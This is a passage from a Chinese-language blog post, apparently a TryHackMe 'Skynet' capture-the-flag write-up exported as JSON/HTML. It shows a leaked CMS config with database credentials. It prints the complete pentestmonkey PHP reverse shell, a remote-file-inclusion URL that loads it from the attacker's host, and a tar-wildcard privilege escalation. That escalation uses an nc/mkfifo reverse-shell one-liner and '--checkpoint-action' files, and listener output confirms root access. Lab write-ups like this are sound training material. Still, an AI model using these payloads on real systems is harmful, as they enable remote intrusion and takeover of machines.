variable\">$db</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"cuppa\"</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"root\"</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"Db@dmin\"</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$table_prefix</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"cu_\"</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$administrator_template</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"default\"</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$list_limit</span> <span class=\"token operator\">=</span> <span class=\"token number\">25</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$token</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"OBqIPqlFWf3X\"</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$allowed_extensions</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx\"</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$upload_default_path</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"media/uploadsFiles\"</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$maximum_file_size</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"5242880\"</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$secure_login</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$secure_login_value</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$secure_login_redirect</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span> \n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n</details>\n<p>我们需要制作一个反向shell脚本并托管在http服务上，然后利用漏洞允许执行远程文件的漏洞获取反向shell连接。</p>\n<details class=\"custom-details\">\n<summary>reverse shell</summary>\n<p><pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">&lt;?php\n&#x2F;&#x2F; php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;pentestmonkey&#x2F;php-reverse-shell&#x2F;master&#x2F;php-reverse-shell.php\n&#x2F;&#x2F; Copyright (C) 2007 pentestmonkey@pentestmonkey.net\n\nset_time_limit (0);\n$VERSION &#x3D; &quot;1.0&quot;;\n$ip &#x3D; &#39;10.4.63.84&#39;;\n$port &#x3D; 4242;\n$chunk_size &#x3D; 1400;\n$write_a &#x3D; null;\n$error_a &#x3D; null;\n$shell &#x3D; &#39;uname -a; w; id; sh -i&#39;;\n$daemon &#x3D; 0;\n$debug &#x3D; 0;\n\nif (function_exists(&#39;pcntl_fork&#39;)) &#123;\n\t$pid &#x3D; pcntl_fork();\n\t\n\tif ($pid &#x3D;&#x3D; -1) &#123;\n\t\tprintit(&quot;ERROR: Can&#39;t fork&quot;);\n\t\texit(1);\n\t&#125;\n\t\n\tif ($pid) &#123;\n\t\texit(0);  &#x2F;&#x2F; Parent exits\n\t&#125;\n\tif (posix_setsid() &#x3D;&#x3D; -1) &#123;\n\t\tprintit(&quot;Error: Can&#39;t setsid()&quot;);\n\t\texit(1);\n\t&#125;\n\n\t$daemon &#x3D; 1;\n&#125; else &#123;\n\tprintit(&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;);\n&#125;\n\nchdir(&quot;&#x2F;&quot;);\n\numask(0);\n\n&#x2F;&#x2F; Open reverse connection\n$sock &#x3D; fsockopen($ip, $port, $errno, $errstr, 30);\nif (!$sock) &#123;\n\tprintit(&quot;$errstr ($errno)&quot;);\n\texit(1);\n&#125;\n\n$descriptorspec &#x3D; array(\n   0 &#x3D;&gt; array(&quot;pipe&quot;, &quot;r&quot;),  &#x2F;&#x2F; stdin is a pipe that the child will read from\n   1 &#x3D;&gt; array(&quot;pipe&quot;, &quot;w&quot;),  &#x2F;&#x2F; stdout is a pipe that the child will write to\n   2 &#x3D;&gt; array(&quot;pipe&quot;, &quot;w&quot;)   &#x2F;&#x2F; stderr is a pipe that the child will write to\n);\n\n$process &#x3D; proc_open($shell, $descriptorspec, $pipes);\n\nif (!is_resource($process)) &#123;\n\tprintit(&quot;ERROR: Can&#39;t spawn shell&quot;);\n\texit(1);\n&#125;\n\nstream_set_blocking($pipes[0], 0);\nstream_set_blocking($pipes[1], 0);\nstream_set_blocking($pipes[2], 0);\nstream_set_blocking($sock, 0);\n\nprintit(&quot;Successfully opened reverse shell to $ip:$port&quot;);\n\nwhile (1) &#123;\n\tif (feof($sock)) &#123;\n\t\tprintit(&quot;ERROR: Shell connection terminated&quot;);\n\t\tbreak;\n\t&#125;\n\n\tif (feof($pipes[1])) &#123;\n\t\tprintit(&quot;ERROR: Shell process terminated&quot;);\n\t\tbreak;\n\t&#125;\n\n\t$read_a &#x3D; array($sock, $pipes[1], $pipes[2]);\n\t$num_changed_sockets &#x3D; stream_select($read_a, $write_a, $error_a, null);\n\n\tif (in_array($sock, $read_a)) &#123;\n\t\tif ($debug) printit(&quot;SOCK READ&quot;);\n\t\t$input &#x3D; fread($sock, $chunk_size);\n\t\tif ($debug) printit(&quot;SOCK: $input&quot;);\n\t\tfwrite($pipes[0], $input);\n\t&#125;\n\n\tif (in_array($pipes[1], $read_a)) &#123;\n\t\tif ($debug) printit(&quot;STDOUT READ&quot;);\n\t\t$input &#x3D; fread($pipes[1], $chunk_size);\n\t\tif ($debug) printit(&quot;STDOUT: $input&quot;);\n\t\tfwrite($sock, $input);\n\t&#125;\n\n\tif (in_array($pipes[2], $read_a)) &#123;\n\t\tif ($debug) printit(&quot;STDERR READ&quot;);\n\t\t$input &#x3D; fread($pipes[2], $chunk_size);\n\t\tif ($debug) printit(&quot;STDERR: $input&quot;);\n\t\tfwrite($sock, $input);\n\t&#125;\n&#125;\n\nfclose($sock);\nfclose($pipes[0]);\nfclose($pipes[1]);\nfclose($pipes[2]);\nproc_close($process);\n\nfunction printit ($string) &#123;\n\tif (!$daemon) &#123;\n\t\tprint &quot;$string\\n&quot;;\n\t&#125;\n&#125;\n\n?&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n</p>\n</details>\n<p>输入<code>http://10.10.185.253/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.4.63.84/reverse_shell.php</code>，成功获取反向shell连接。</p>\n<details class=\"custom-details\">\n<summary>nc</summary>\n<p><pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">\n└─$ rlwrap nc -lvnp 4242\nNcat: Version 7.92 ( https:&#x2F;&#x2F;nmap.org&#x2F;ncat )\nNcat: Listening on :::4242\nNcat: Listening on 0.0.0.0:4242\nNcat: Connection from 10.10.185.253.\nNcat: Connection from 10.10.185.253:53372.\nLinux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU&#x2F;Linux\n 12:29:29 up  4:10,  0 users,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nuid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)\nsh: 0: can&#39;t access tty; job control turned off\n$<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n</p>\n</details>\n<h1 id=\"权限提升\"><a href=\"#权限提升\" class=\"headerlink\" title=\"权限提升\"></a>权限提升</h1><p>将反向shell升级为tty。</p>\n<pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>枚举linux信息后，我们在进程中发现了<code>crontab</code>的服务，</p>\n<div class=\"custom-quote tip\">\n<span class=\"custom-quote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M20.86 14.13C20 14.7 19.56 15.74 19.77 16.76C20.13 18.55 18.55 20.13 16.76 19.77C15.74 19.57 14.7 20 14.13 20.86C13.12 22.38 10.89 22.38 9.88 20.86C9.3 20 8.26 19.56 7.24 19.77C5.45 20.13 3.87 18.55 4.23 16.76C4.43 15.74 4 14.7 3.14 14.13C1.62 13.12 1.62 10.89 3.14 9.88C4 9.3 4.44 8.26 4.23 7.24C3.87 5.45 5.45 3.87 7.24 4.23C8.26 4.44 9.3 4 9.87 3.14C10.88 1.62 13.11 1.62 14.12 3.14C14.7 4 15.74 4.44 16.76 4.23C18.55 3.87 20.13 5.45 19.77 7.24C19.56 8.26 20 9.3 20.86 9.87C22.38 10.88 22.38 13.12 20.86 14.13Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M12.01 15C12.01 14.5 12.01 14.5 12.01 14.5C12.04 13.75 13 13.46 14.04 12.2C14.41 11.74 14.69 11.41 14.86 10.85C15.15 9.95 14.92 9.18 14.86 9.02C14.8 8.79 14.52 8 13.72 7.46C13.06 7.02 12.42 7 12.14 7C11.9 7 11.36 7 10.78 7.3C10.28 7.56 9.98 7.9 9.83 8.1C9.24 8.82 9.06 9.63 9 10.06\"></path>\n<path stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M11.99 18H12.01\"></path>\n</svg></span>\n<p class=\"custom-quote-title\">crobtab</p>\n<p>Linux crontab 是用来定期执行程序的命令。当安装完成操作系统之后，默认便会启动此任务调度命令。crond 命令每分钟会定期检查是否有要执行的工作，如果有要执行的工作便会自动执行该工作。</p>\n\n</div>\n<details class=\"custom-details\">\n<summary>查看crontab服务</summary>\n<p><p><code>ps -ef</code>查看进程，发现靶机上运行了定时任务。</p>\n<pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">....\nsyslog     990     1  0 08:18 ?        00:00:00 &#x2F;usr&#x2F;sbin&#x2F;rsyslogd -n\nroot       994     1  0 08:18 ?        00:00:00 &#x2F;usr&#x2F;sbin&#x2F;cron -f\nroot      1001     1  0 08:18 ?        00:00:00 &#x2F;usr&#x2F;sbin&#x2F;acpid\n....<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n</p>\n</details>\n<p>查看<code>crontab</code>的配置文件，确认定时任务的具体信息。</p>\n<details class=\"custom-details\">\n<summary>查看crontab配置</summary>\n<p><pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">cat &#x2F;etc&#x2F;crontab\n# &#x2F;etc&#x2F;crontab: system-wide crontab\n# Unlike any other crontab you don&#39;t have to run the &#96;crontab&#39;\n# command to install the new version when you edit this file\n# and files in &#x2F;etc&#x2F;cron.d. These files also have username fields,\n# that none of the other crontabs do.\n\nSHELL&#x3D;&#x2F;bin&#x2F;sh\nPATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin\n\n# m h dom mon dow user  command\n*&#x2F;1 *   * * *   root    &#x2F;home&#x2F;milesdyson&#x2F;backups&#x2F;backup.sh\n17 *    * * *   root    cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.hourly\n25 6    * * *   root    test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.daily )\n47 6    * * 7   root    test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.weekly )\n52 6    1 * *   root    test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.monthly )\n#\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</p>\n</details>\n<p>在配置文件中，靶机上每分钟都会运行<code>/home/milesdyson/backups/backup.sh</code>文件。</p>\n<details class=\"custom-details\">\n<summary>查看<code>backup.sh</code>的内容</summary>\n<p><pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">#!&#x2F;bin&#x2F;bash\ncd &#x2F;var&#x2F;www&#x2F;html\ntar cf &#x2F;home&#x2F;milesdyson&#x2F;backups&#x2F;backup.tgz *<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n</p>\n</details>\n<p>这是个备份脚本，进入到<code>/var/www/html</code>目录下执行<code>tar</code>命令。在这里，我们发现了<code>tar</code>命令使用了通配符<code>*</code>,这给我们的攻击提供了一个途径。</p>\n<details class=\"custom-details\">\n<summary>获取root权限</summary>\n<p><pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">$ cd &#x2F;var&#x2F;www&#x2F;html\n$ echo &quot;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.4.63.84 1234 &gt;&#x2F;tmp&#x2F;f&quot; &gt; shell.sh touch &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;--checkpoint-action&#x3D;exec&#x3D;sh shell.sh&quot; touch &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;--checkpoint&#x3D;1&quot;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>在<code>/var/www/html/</code> 创建三个文件<code>--checkpoint-action=exec=sh shell.sh</code>,<code>--checkpoint=1</code>,和<code>shell.sh</code>。同时开启<code>nc</code>,等待定时任务执行后就能获得<code>root</code>权限。</p>\n<pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">└─$ rlwrap nc -lvnp 1234\nNcat: Version 7.92 ( https:&#x2F;&#x2F;nmap.org&#x2F;ncat )\nNcat: Listening on :::1234\nNcat: Listening on 0.0.0.0:1234\nNcat: Connection from 10.10.13.165.\nNcat: Connection from 10.10.13.165:40452.\n&#x2F;bin&#x2F;sh: 0: can&#39;t access tty; job control turned off\nwhoami\nroot<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n</p>\n</details>\n<h1 id=\"使用工具\"><a href=\"#使用工具\" class=\"headerlink\" title=\"使用工具\"></a>使用工具</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><ul>\n<li>Namp</li>\n<li>MetaSploit</li>\n<li>gobuster</li>\n<li><a href=\"https://github.com/ShawnDEvans/smbmap\">smbmap</a></li>\n</ul></blockquote>\n<h1 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><ul>\n<li><a href=\"https://miloserdov.org/?p=4261#23\">NetBIOS: what it is, how it works and how to use in information security</a></li>\n<li><a href=\"https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/\">Exploiting wildcards on Linux</a></li>\n</ul></blockquote>\n","feature":true,"text":"Skynet是Tryhack平台上一个易受攻击的终结者主题系统。 搜集信息老套路，先用nmap扫描靶机运行的服务端口。 nmap搜集信息 └─$ sudo nmap -sV 10.10.40.174 -T4 -oA skynet-V Starting Nmap 7.92 ( ht...","link":"","photos":[],"count_time":{"symbolsCount":"24k","symbolsTime":"22 mins."},"categories":[{"name":"CTF","slug":"CTF","count":6,"path":"api/categories/CTF.json"}],"tags":[{"name":"Linux Privilege Escalation","slug":"Linux-Privilege-Escalation","count":2,"path":"api/tags/Linux-Privilege-Escalation.json"},{"name":"tryhackme","slug":"tryhackme","count":6,"path":"api/tags/tryhackme.json"},{"name":"Skynet","slug":"Skynet","count":1,"path":"api/tags/Skynet.json"},{"name":"wildcards on Linux","slug":"wildcards-on-Linux","count":1,"path":"api/tags/wildcards-on-Linux.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%90%9C%E9%9B%86%E4%BF%A1%E6%81%AF\"><span class=\"toc-text\">搜集信息</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90\"><span class=\"toc-text\">深入分析</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#HTTP%E6%9C%8D%E5%8A%A1\"><span class=\"toc-text\">HTTP服务</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#NetBIOS-SSN\"><span class=\"toc-text\">NetBIOS-SSN</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8\"><span class=\"toc-text\">漏洞利用</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87\"><span class=\"toc-text\">权限提升</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%BD%BF%E7%94%A8%E5%B7%A5%E5%85%B7\"><span class=\"toc-text\">使用工具</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3\"><span class=\"toc-text\">参考文档</span></a></li></ol>","author":{"name":"剑三","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"御剑乘风来 除魔天地间","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{},"next_post":{"title":"Game Zone CTF - TryHackMe.com","uid":"3bda3d0f8b3421f49ec453f4d896421a","slug":"GameZone","date":"2022-04-06T12:43:08.070Z","updated":"2022-04-07T18:32:41.489Z","comments":true,"path":"api/articles/GameZone.json","keywords":null,"cover":"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/gamezone/images.png","text":"Game Zone介绍SQLi(通过 SQLMap 手动利用这个漏洞)、破解用户哈希密码、使用SSH隧道显示隐藏服务以及使用metasploit有效负载获得root特权。 搜集信息按照惯例，使用nmap确认靶机上运行的服务，以此来确认我们接下来的步骤。 nmap 10.10.33...","link":"","photos":[],"count_time":{"symbolsCount":"12k","symbolsTime":"10 mins."},"categories":[{"name":"CTF","slug":"CTF","count":6,"path":"api/categories/CTF.json"}],"tags":[{"name":"Linux Privilege Escalation","slug":"Linux-Privilege-Escalation","count":2,"path":"api/tags/Linux-Privilege-Escalation.json"},{"name":"tryhackme","slug":"tryhackme","count":6,"path":"api/tags/tryhackme.json"},{"name":"Game Zone","slug":"Game-Zone","count":1,"path":"api/tags/Game-Zone.json"},{"name":"SQLi","slug":"SQLi","count":1,"path":"api/tags/SQLi.json"}],"author":{"name":"剑三","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"御剑乘风来 除魔天地间","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true}}